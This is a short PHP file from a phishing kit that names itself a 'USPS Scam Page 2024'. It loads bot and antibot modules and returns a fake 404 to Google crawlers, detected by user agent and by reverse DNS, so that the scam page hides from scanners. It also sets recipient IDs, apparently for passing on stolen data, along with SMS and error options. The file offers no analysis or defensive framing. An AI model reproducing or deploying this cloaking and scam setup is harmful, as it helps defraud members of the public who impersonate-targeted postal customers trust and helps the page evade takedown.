<?php
   session_start();
   error_reporting(0);
   include('bot/index.php');
   include('antibots/index.php');
   if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
   if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

/* 
USPS Scam Page 2024
CODED BY @drfxnd
*/
$user_ids=array("1096721156");
$sms='1';
$error='1';
?>